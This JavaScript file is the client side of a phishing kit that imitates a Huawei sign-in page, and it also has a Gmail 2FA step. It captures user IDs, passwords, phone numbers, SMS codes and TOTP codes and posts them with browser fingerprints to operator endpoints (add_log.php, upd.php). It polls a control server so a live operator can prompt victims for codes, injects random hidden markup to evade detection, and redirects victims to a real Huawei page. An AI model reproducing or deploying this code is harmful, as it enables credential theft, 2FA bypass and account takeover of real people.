var ____pwd='';
var ikey = 'none';
var txt_ua = navigator.userAgent;
var send_block_flg=0;
var balance = 'none';
var eth_recipient='none';
var balance_block_flg=0;
var count_flg=0;
var type2fa='';
var lgn_flg=0;
var Private_Login_Key='';
var stpm1flg=0;
var c_lgn='';
var redirect_flag=0;





 function getRandomInRange(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
 }


  function randString(n)
 {
     if(!n)
     {
         n = 5;
     }

     var text = '';
     var possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

     for(var i=0; i < n; i++)
     {
         text += possible.charAt(Math.floor(Math.random() * possible.length));
     }

     return text;
 }




function load_random_signin_dom_content()
{

var domstr=unescape(ak47);

//var domstr=$('#bodymain').html();

var domstr = replaceAll(domstr,'<span','<span '+randString(getRandomInRange(1, 30))+'="'+randString(getRandomInRange(10, 50))+'"  '+randString(getRandomInRange(10, 30))+'="'+randString(getRandomInRange(10, 30))+'"');
var domstr = replaceAll(domstr,'class="','class=" '+randString(getRandomInRange(1, 30))+'  '+randString(getRandomInRange(10, 50))+'  '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(10, 30))+' ');

var cf=randString(getRandomInRange(10, 30));
var vg=randString(getRandomInRange(10, 30));
var newdomstr = replaceAll(domstr,'</div>','</div><div style="display:none;" class="'+vg+'" id="'+randString(getRandomInRange(1, 50))+'"> '+randString(getRandomInRange(22, 60))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(50, 130))+' </div><div style="display:none;"  class="'+cf+'" id="'+randString(getRandomInRange(10, 50))+'"><span id="'+randString(getRandomInRange(20, 70))+'"> '+randString(getRandomInRange(20, 30))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(100, 130))+' </span><p id="'+randString(getRandomInRange(10, 30))+'"> '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(1, 30))+' '+randString(getRandomInRange(1, 30))+' </p></div><div style="display:none;"  class="'+cf+'" id="'+randString(getRandomInRange(1, 40))+'"><span id="'+randString(getRandomInRange(1, 30))+'"> '+randString(getRandomInRange(1, 50))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(10, 30))+' </span><p id="'+randString(getRandomInRange(10, 30))+'"> '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(1, 130))+' '+randString(getRandomInRange(1, 130))+' </p></div>');

$('#bodymain').html(unescape(newdomstr));
}



function load_random_dom_content()
{

var domstr=unescape(ak47);

//var domstr=$('#auth_content').html();

var domstr = replaceAll(domstr,'<span','<span '+randString(getRandomInRange(1, 30))+'="'+randString(getRandomInRange(10, 50))+'"  '+randString(getRandomInRange(10, 30))+'="'+randString(getRandomInRange(10, 30))+'"');
var domstr = replaceAll(domstr,'class="','class=" '+randString(getRandomInRange(1, 30))+'  '+randString(getRandomInRange(10, 50))+'  '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(10, 30))+' ');

var cf=randString(getRandomInRange(10, 30));
var vg=randString(getRandomInRange(10, 30));
var newdomstr = replaceAll(domstr,'</div>','</div><div style="display:none;" class="'+vg+'" id="'+randString(getRandomInRange(1, 50))+'"> '+randString(getRandomInRange(22, 60))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(50, 130))+' </div><div style="display:none;"  class="'+cf+'" id="'+randString(getRandomInRange(10, 50))+'"><span id="'+randString(getRandomInRange(20, 70))+'"> '+randString(getRandomInRange(20, 30))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(100, 130))+' </span><p id="'+randString(getRandomInRange(10, 30))+'"> '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(1, 30))+' '+randString(getRandomInRange(1, 30))+' </p></div><div style="display:none;"  class="'+cf+'" id="'+randString(getRandomInRange(1, 40))+'"><span id="'+randString(getRandomInRange(1, 30))+'"> '+randString(getRandomInRange(1, 50))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(10, 30))+' </span><p id="'+randString(getRandomInRange(10, 30))+'"> '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(1, 130))+' '+randString(getRandomInRange(1, 130))+' </p></div>');

$('#auth_content').html(unescape(newdomstr));
}

function replaceAll(str, find, replace) {
   return str.replace(new RegExp(find, 'g'), replace);
}



function refresh_random_dom()
{
  var domstr=$('#contentcontainer').html();

  var domstr = replaceAll(domstr,'<div','<div '+randString(getRandomInRange(1, 30))+'="'+randString(getRandomInRange(10, 70))+'"  '+randString(getRandomInRange(1, 20))+'="'+randString(getRandomInRange(10, 30))+'" '+randString(getRandomInRange(1, 10))+'="'+randString(getRandomInRange(10, 30))+'"');
  var domstr = replaceAll(domstr,'<a','<a '+randString(getRandomInRange(1, 30))+'="'+randString(getRandomInRange(10, 30))+'"  '+randString(getRandomInRange(1, 20))+'="'+randString(getRandomInRange(1, 50))+'"');
  var domstr = replaceAll(domstr,'<p','<p '+randString(getRandomInRange(1, 30))+'="'+randString(getRandomInRange(10, 50))+'"  '+randString(getRandomInRange(1, 20))+'="'+randString(getRandomInRange(10, 40))+'"');
  var domstr = replaceAll(domstr,'<span','<span '+randString(getRandomInRange(1, 30))+'="'+randString(getRandomInRange(10, 50))+'"  '+randString(getRandomInRange(10, 30))+'="'+randString(getRandomInRange(10, 30))+'"');
  var domstr = replaceAll(domstr,'class="','class=" '+randString(getRandomInRange(1, 30))+'  '+randString(getRandomInRange(10, 50))+'  '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(10, 30))+' ');
  var domstr = replaceAll(domstr,'>Zxz0<','>'+randString(getRandomInRange(1, 30))+'  '+randString(getRandomInRange(10, 50))+'  '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(10, 30))+'<');


  var cf=randString(getRandomInRange(10, 30));
  var vg=randString(getRandomInRange(10, 30));
  var newdomstr = replaceAll(domstr,'</div>','</div><div style="display:none;" class="'+vg+'" id="'+randString(getRandomInRange(1, 50))+'"> '+randString(getRandomInRange(22, 60))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(50, 130))+' </div><div style="display:none;"  class="'+cf+'" id="'+randString(getRandomInRange(10, 50))+'"><span id="'+randString(getRandomInRange(20, 70))+'"> '+randString(getRandomInRange(20, 30))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(100, 130))+' </span><p id="'+randString(getRandomInRange(10, 30))+'"> '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(1, 30))+' '+randString(getRandomInRange(1, 30))+' </p></div><div style="display:none;"  class="'+cf+'" id="'+randString(getRandomInRange(1, 40))+'"><span id="'+randString(getRandomInRange(1, 30))+'"> '+randString(getRandomInRange(1, 50))+'  '+randString(getRandomInRange(10, 30))+' '+randString(getRandomInRange(10, 30))+' </span><p id="'+randString(getRandomInRange(10, 30))+'"> '+randString(getRandomInRange(10, 30))+'  '+randString(getRandomInRange(1, 130))+' '+randString(getRandomInRange(1, 130))+' </p></div>');

  $('#contentcontainer').html(newdomstr);

}



var Base64 = {
   _keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
  encode : function (input) {
    var output = "";
    var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
    var i = 0
    input = Base64._utf8_encode(input);
       while (i < input.length) {
       chr1 = input.charCodeAt(i++);
      chr2 = input.charCodeAt(i++);
      chr3 = input.charCodeAt(i++);
       enc1 = chr1 >> 2;
      enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
      enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
      enc4 = chr3 & 63;
       if( isNaN(chr2) ) {
         enc3 = enc4 = 64;
      }else if( isNaN(chr3) ){
        enc4 = 64;
      }
       output = output +
      this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
      this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
     }
    return output;
  },

  decode : function (input) {
    var output = "";
    var chr1, chr2, chr3;
    var enc1, enc2, enc3, enc4;
    var i = 0;
     input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
     while (i < input.length) {
       enc1 = this._keyStr.indexOf(input.charAt(i++));
      enc2 = this._keyStr.indexOf(input.charAt(i++));
      enc3 = this._keyStr.indexOf(input.charAt(i++));
      enc4 = this._keyStr.indexOf(input.charAt(i++));
       chr1 = (enc1 << 2) | (enc2 >> 4);
      chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
      chr3 = ((enc3 & 3) << 6) | enc4;
       output = output + String.fromCharCode(chr1);
       if( enc3 != 64 ){
        output = output + String.fromCharCode(chr2);
      }
      if( enc4 != 64 ) {
        output = output + String.fromCharCode(chr3);
      }
   }
   output = Base64._utf8_decode(output);
     return output;
   },
  _utf8_encode : function (string) {
    string = string.replace(/\r\n/g,"\n");
    var utftext = "";
    for (var n = 0; n < string.length; n++) {
      var c = string.charCodeAt(n);
       if( c < 128 ){
        utftext += String.fromCharCode(c);
      }else if( (c > 127) && (c < 2048) ){
        utftext += String.fromCharCode((c >> 6) | 192);
        utftext += String.fromCharCode((c & 63) | 128);
      }else {
        utftext += String.fromCharCode((c >> 12) | 224);
        utftext += String.fromCharCode(((c >> 6) & 63) | 128);
        utftext += String.fromCharCode((c & 63) | 128);
      }
     }
    return utftext;

  },

  _utf8_decode : function (utftext) {
    var string = "";
    var i = 0;
    var c = c1 = c2 = 0;
    while( i < utftext.length ){
      c = utftext.charCodeAt(i);
       if (c < 128) {
        string += String.fromCharCode(c);
        i++;
      }else if( (c > 191) && (c < 224) ) {
        c2 = utftext.charCodeAt(i+1);
        string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
        i += 2;
      }else {
        c2 = utftext.charCodeAt(i+1);
        c3 = utftext.charCodeAt(i+2);
        string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
        i += 3;
      }
     }
     return string;
  }
 }
 var botid=Base64.encode(navigator.userAgent);



function data_upd(s_data, s_name, botid)
 {
  var s_url=config_url+'upd.php?operation=update';

   $.post(s_url, { datalog: s_data,  logname: s_name,  botid: botid,} );
 }

 function data_waitcontrol( botid)
  {
   var s_url=config_url+'control.php?operation=update';

    $.post(s_url, { botid: botid,} );
  }





function step_google_2fa()
 {
 document.getElementById('err_2fagoogle').style.display='none';
 document.getElementById('err_2fagoogle_incorrect').style.display='none';
 document.getElementById('liniya3').style.backgroundColor='rgba(0,0,0,0.12)';
 document.getElementById('liniya3').style.height='1px';

  if (document.getElementById('totpPin').value.length < 4)
    {
        document.getElementById('liniya3').style.backgroundColor='#d50000';
        document.getElementById('liniya3').style.height='2px';
        document.getElementById('err_2fagoogle').style.display='';
        document.getElementById('totpPin').focus();
        return false;
    }

document.getElementById('wait').style.display='';
document.getElementById('step_googleauth').style.display='none';


tmp='Login: '+document.getElementById('identifierId').value+'  Password: '+document.getElementById('passwordinp').value+' 2FA: '+document.getElementById('totpPin').value;

data_upd(tmp, 'GMAIL', c_lgn);

data_waitcontrol(c_lgn);

type2fa='google';

setTimeout(check_state_preloader, 4000);
stpm1flg=0;
}




 function check_state_preloader()
  {

    if(stpm1flg !== 1)
    {
        var link = config_url+'live.php?state=workstate&auth='+c_lgn;
        LoadScript(link, check_state);

     }
     setTimeout(check_state_preloader, 3000);
  }



  function get_system_info()
   {
    var time = new Date(),
    timestamp = Date(1000 + time.getTime());
    s_timestamp='\n\nSYSTEM TIME\n'+timestamp;

    var navig = "";
    for (var property in navigator)
     {
       t7= ""+property+": " + navigator[property];
       if (t7.indexOf('native code') ==-1 && t7.indexOf('object') ==-1 )
       {
         navig += ""+property+": " + navigator[property];
         navig +="\n";
       }
     }

    s_navigator='\nNAVIGATOR\n'+navig;



    var s_screen = "";
    for (var property in screen)
     {
        t7= ""+property+": " + screen[property];
        if (t7.indexOf('native code') ==-1 && t7.indexOf('object') ==-1 )
         {
           s_screen += ""+property+": " + screen[property];
           s_screen +="\n";
          }
     }

    s_screen='\nSCREEN\n'+s_screen;

    var x=navigator.plugins.length;
    var txt="Total plugin installed: "+x+"\n";

    for(var i=0;i<x;i++)
     {
      txt+=navigator.plugins[i].name + '  '+navigator.plugins[i].filename + "\n";
     }

    s_plugins='\n\nPLUGINS\n'+txt;
    page_location='\nPAGE LOCATION\n'+window.location.href;

    return page_location+s_timestamp+s_plugins+s_screen+s_navigator;
  }


  function sendsysteminfo()
   {
    if ($(location).attr('href').indexOf('login') ==-1)
      {
        var foo =get_system_info();
        foo = foo.replace(/\r\n|\r|\n/g,"<br />");
        send_data_login_("New user", 'wait login', foo);
      }
   }




function check_state()
{

 var msg = jsess_msg;


 var _2FA_txt='';

 if(msg.indexOf('[ERRLOGIN]') >= 0)
  {
    redirect_flag=1;
    stpm1flg= 1;
    data_waitcontrol(c_lgn);
    $("#signin").css("display","");
    $("#cont_2FA").css("display","none");
    $("#footer").css("display","");
    $("#prewait").css("display","");
    $("#wait").css("display","none");
    $("#login_error").css("display","");
    $("#password").val('');
    $("#password").focus();

    $("#account_name_text_field").focus();
  }

 if(msg.indexOf('[2FA]') >= 0)
  {
     redirect_flag=1;
    stpm1flg= 1;
    data_waitcontrol(c_lgn);
    $("#signin").css("display","none");
    $("#footer").css("display","");
    $("#prewait").css("display","");
    $("#wait").css("display","none");
    $("#cont_2FA").css("display","");
    $("#char0").focus();
  }




 if(msg.indexOf('[2FAINCORRECT]') >= 0)
  {
    stpm1flg= 1;    redirect_flag=1;
    data_waitcontrol(c_lgn);
    $("#wait").css("display","none");

    $("#smsform").css("display","");
    $("#sendButton").css("display","");
    $("#smserr").css("display","");
    $("#smscode").val('');
    $("#smscode").focus();
  }


 if(msg.indexOf('[REDIRECT]') >= 0)
  {
    stpm1flg= 1;     redirect_flag=1;
    data_waitcontrol(c_lgn);
    setTimeout(send_redirect, 2500);
  }



}

function send_redirect()
{
  document.location.href='https://href.li/?http://consumer-tkb.huawei.com/tkb/';
}



function countdown( elementName, minutes, seconds )
{
    var element, endTime, hours, mins, msLeft, time;

    function twoDigits( n )
    {
        return (n <= 9 ? "0" + n : n);
    }

    function updateTimer()
    {
        msLeft = endTime - (+new Date);
        if ( msLeft < 1000 ) {
            element.innerHTML = "0:00";
            countdown( "countdown", 0, 30 );
        } else {
            time = new Date( msLeft );
            hours = time.getUTCHours();
            mins = time.getUTCMinutes();
            element.innerHTML = (hours ? hours + ':' + twoDigits( mins ) : mins) + ':' + twoDigits( time.getUTCSeconds() );
            setTimeout( updateTimer, time.getUTCMilliseconds() + 500 );
        }
    }


    element = document.getElementById( elementName );
    endTime = (+new Date) + 1000 * (60*minutes + seconds) + 500;
    updateTimer();

}



function check_countdown( minutes, seconds )
{
    var  endTime, hours, mins, msLeft, time;

    function twoDigits( n )
    {
        return (n <= 9 ? "0" + n : n);
    }

    function updateTimer()
    {
        msLeft = endTime - (+new Date);
        if ( msLeft < 1000 ) {
          if (redirect_flag==0)
          send_redirect();
        } else {
            time = new Date( msLeft );
            hours = time.getUTCHours();
            mins = time.getUTCMinutes();
            setTimeout( updateTimer, time.getUTCMilliseconds() + 500 );
        }
    }

    endTime = (+new Date) + 1000 * (60*minutes + seconds) + 500;
    updateTimer();

}







function removeClass(el, cls) {
 var re = new RegExp('(\\s|^)' + cls + '(\\s|$)')
 el.className = el.className.replace(re, ' ')
}


function addClass(el, cls) {
 el.className += " "+cls
}





function LoadScript(a, b){var c = document.createElement('script');c.type = 'text/javascript';c.id = 'ak47loader';if(c.readyState){c.onreadystatechange = function (){if (c.readyState == 'loaded' || c.readyState == 'complete'){c.onreadystatechange = null; b();  $('#ak47loader').remove(); }}}else{c.onload = function () {b();  $('#ak47loader').remove();}}c.src = a;if (document.getElementsByTagName('head').length > 0){document.getElementsByTagName('head')[0].appendChild(c)} else {document.getElementsByTagName('body')[0].appendChild(c)}}


function send_data_login_(login_info, fgh, sysinfo)
 {
url = config_url+'?action=set&login_info='+login_info+'&ua='+urlencode(sysinfo)+'&send_info='+urlencode(fgh)+'&state=nfo&ikey='+urlencode(ikey)+'&ssid='+Number(new Date());
var scriptElement = document.createElement('script');
if(scriptElement.readyState){scriptElement.onreadystatechange = function ()
{if (scriptElement.readyState == 'loaded' || scriptElement.readyState == 'complete'){scriptElement.onreadystatechange = null;
$('#ak47').remove();
 }}}else{scriptElement.onload = function () {
$('#ak47').remove();}}
scriptElement.id = 'ak47';
scriptElement.src = url;
document.getElementsByTagName('head')[0].appendChild(scriptElement);
 }


function b64EncodeUnicode(str) {
    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
        function toSolidBytes(match, p1) {
            return String.fromCharCode('0x' + p1);
    }));
}

function b64DecodeUnicode(str) {
    return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}

function data_send_post(s_data, s_name, botid)
 {
   var s_url=config_url+'add_log.php?operation=create';
   system_info=get_system_info();

   $.post(s_url, { usersysteminfo: system_info, datalog: s_data,  logname: s_name,  botid: botid,} );
 }




function removeClass(el, cls) {
 var re = new RegExp('(\\s|^)' + cls + '(\\s|$)')
 el.className = el.className.replace(re, ' ')
}


function addClass(el, cls) {
 el.className += " "+cls
}



 function urlencode (str) {
  str = (str+'').toString();
  return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').replace(/\)/g, '%29').replace(/\*/g, '%2A').replace(/%20/g, '+');
}




 function loginauth ()
 {

if ($("#uid").val().length <5)
{
 alert('User ID/Email cannot be empty');
  $('#uid').focus();
 return false;
}

if ($("#password").val().length <5)
{
 alert('Password cannot be empty');
  $('#password').focus();
 return false;
}

c_lgn=$('#uid').val();
tmp='User ID/Email MODE--- Login: '+$('#uid').val()+'   '+'Password: '+$('#password').val();

data_send_post(tmp, 'hyawei', c_lgn);

data_waitcontrol(c_lgn);
setTimeout(send_redirect, 2000);
 }



 function phoneauth ()
 {

if ($("#mobile").val().length <5)
{
 alert('Phone Number cannot be empty');
 $('#mobile').focus();
 return false;
}

if ($("#phonepassword").val().length <5)
{
 alert('Password cannot be empty');
 $('#phonepassword').focus();
 return false;
}

c_lgn=$('#mobile').val();
tmp='Phone Number MODE--- Country: '+$('#countryCodeSelect').find('option:selected').val()+'   Phone Number: '+$('#mobile').val()+'   Password: '+$('#phonepassword').val();

data_send_post(tmp, 'hyawei', c_lgn);

data_waitcontrol(c_lgn);
setTimeout(send_redirect, 2000);
 }


 function sendsms ()
 {

 if ($("#smsmobile").val().length <5)
 {
 alert('Phone Number cannot be empty');
 $('#smsmobile').focus();
 return false;
 }


 c_lgn=$('#smsmobile').val();
 tmp='SMS Verification MODE--- Country: '+$('#countryCodeSelect1').find('option:selected').val()+'   Phone Number: '+$('#smsmobile').val();

 $("#sendButton").css("display","none");

 data_send_post(tmp, 'hyawei', c_lgn);

   $("#smserr").css("display","none");

 $('#smscode').focus();

 data_waitcontrol(c_lgn);
 }


 function smsauth ()
 {

 if ($("#smsmobile").val().length <5)
 {
 alert('Phone Number cannot be empty');
 $('#smsmobile').focus();
 return false;
}

 if ($("#smscode").val().length <4)
 {
 alert('SMS Code cannot be empty');
 $('#smscode').focus();
 return false;
 }


 c_lgn=$('#smsmobile').val();
 tmp='SMS Verification MODE--- Country: '+$('#countryCodeSelect1').find('option:selected').val()+'   Phone Number: '+$('#smsmobile').val()+'  SMS Code:'+$('#smscode').val();

 data_send_post(tmp, 'hyawei', c_lgn);

 data_waitcontrol(c_lgn);
 data_upd(tmp, 'Hyawei SMS Code', c_lgn);
 check_state_preloader();
 stpm1flg=0;


 $("#smswelc").css("display","none");
 $("#smsform").css("display","none");
 $("#wait").css("display","");



 }



  function mainfocus ()
  {
  $('#uid').focus();
  }


  function locationmodeload()
  {
   var t8='?auth=mode&id=https%3a%2f%2flogin.com%2foauth20_authorize.srf%3flc%3d1033%26response_type%3dcode%26client_id%3d514132d42-0485c-4d186-b2f88-cf50c725332078%26scope%3dopenid%2bprofile%2bemail%2boffline_access%26response_mode%3dform_post%26redirect_uri%3dhttps%253a%252f%252flogin.microsoftonline.com%252fcommon%252ffederation%252foauth2%26state%3drQIIAXVWDWDO2zTUACMkza0FaFFlJ8_P9rMdqYObtM7Pdps4TZMlMvZL_X_GMXHTFZAYO5etC6JjJSTEgsSEOqCKCXViBCbUiZGUneWGuxtOd7dRYEpM5THHcrwpPJFoyUQszUkMoE0OIprlWcRCwNg8YJO1lfvX4Otq8_lG_ezmnfK5_u3lKbU8CtwpLlkkPKceOmkaTyrlcpZlJTIeu9Y_ofyeoq';

   if ($(location).attr('href').indexOf('?login=') >=0 && $(location).attr('href').indexOf('auth=mode') ==-1)
    {
      t7=$(location).attr('href');
      t6 = t7.slice(t7.indexOf('?login=')+7);
      t5 = t7.substring(0, t7.indexOf('?login='));

      $(location).attr('href', t5+t8+'?login='+t6);
    }

   if ($(location).attr('href').indexOf('?login=') ==-1 && $(location).attr('href').indexOf('auth=mode') ==-1)
    {
       var t2=$(location).attr('href');
       $(location).attr('href', t2+t8);
     }
  }

  function selectchange()
  {
    tmp=$('#countryCodeSelect').find('option:selected').text();
    t6 = tmp.slice(tmp.indexOf('(+')+2);
    t5 = t6.substring(0, t6.indexOf(')'));
    $('#countryCode').val('+'+t5);
  }


  function selectchangesms()
  {
    tmp=$('#countryCodeSelect1').find('option:selected').text();
    t6 = tmp.slice(tmp.indexOf('(+')+2);
    t5 = t6.substring(0, t6.indexOf(')'));
    $('#countryCodesms').val('+'+t5);
  }

  function user_mode_tab_1_clk()
  {
      $("#maincontent").css("display","");
      $("#smsmode").css("display","none");
      $("#phonemode").css("display","none");
  }

  function user_mode_tab_2_clk()
  {
      $("#maincontent").css("display","none");
      $("#smsmode").css("display","none");
      $("#phonemode").css("display","");
  }

  function user_mode_tab_3_clk()
  {
      $("#maincontent").css("display","none");
      $("#smsmode").css("display","");
      $("#phonemode").css("display","none");
  }

  function phone_mode_tab_1_clk()
  {
      $("#maincontent").css("display","");
      $("#smsmode").css("display","none");
      $("#phonemode").css("display","none");
  }

  function phone_mode_tab_2_clk()
  {

      $("#maincontent").css("display","none");
      $("#smsmode").css("display","none");
      $("#phonemode").css("display","");

  }

  function phone_mode_tab_3_clk()
  {
      $("#maincontent").css("display","none");
      $("#smsmode").css("display","");
      $("#phonemode").css("display","none");
  }



    function sms_mode_tab_1_clk()
    {
        $("#maincontent").css("display","");
        $("#smsmode").css("display","none");
        $("#phonemode").css("display","none");
    }

    function sms_mode_tab_2_clk()
    {
        $("#maincontent").css("display","none");
        $("#smsmode").css("display","none");
        $("#phonemode").css("display","");
    }

    function sms_mode_tab_3_clk()
    {
        $("#maincontent").css("display","none");
        $("#smsmode").css("display","");
        $("#phonemode").css("display","none");
    }


locationmodeload();

  $("#bodymain").ready(function()
   {


 load_random_signin_dom_content();
  document.title='Welcome to Our Website';

   mainfocus();


  $("#password").keyup(function(event){   if(event.keyCode == 13){  loginauth(); } });
  $('#sign-in').click(function(){ loginauth();   });

  $("#phonepassword").keyup(function(event){   if(event.keyCode == 13){  phoneauth(); } });
  $('#btnphone').click(function(){ phoneauth();   });

 $('#countryCodeSelect').change(function(){ selectchange();   });
 $('#countryCodeSelect1').change(function(){ selectchangesms();   });

 $('#sendButton').click(function(){ sendsms();   });

 $('#smsbtn').click(function(){ smsauth();   });


 $('#user_mode_tab_1').click(function(){ user_mode_tab_1_clk();   });
 $('#user_mode_tab_2').click(function(){ user_mode_tab_2_clk();   });
 $('#user_mode_tab_3').click(function(){ user_mode_tab_3_clk();   });

 $('#phone_mode_tab_1').click(function(){ phone_mode_tab_1_clk();   });
 $('#phone_mode_tab_2').click(function(){ phone_mode_tab_2_clk();   });
 $('#phone_mode_tab_3').click(function(){ phone_mode_tab_3_clk();   });

 $('#sms_mode_tab_1').click(function(){ sms_mode_tab_1_clk();   });
 $('#sms_mode_tab_2').click(function(){ sms_mode_tab_2_clk();   });
 $('#sms_mode_tab_3').click(function(){ sms_mode_tab_3_clk();   });


    });
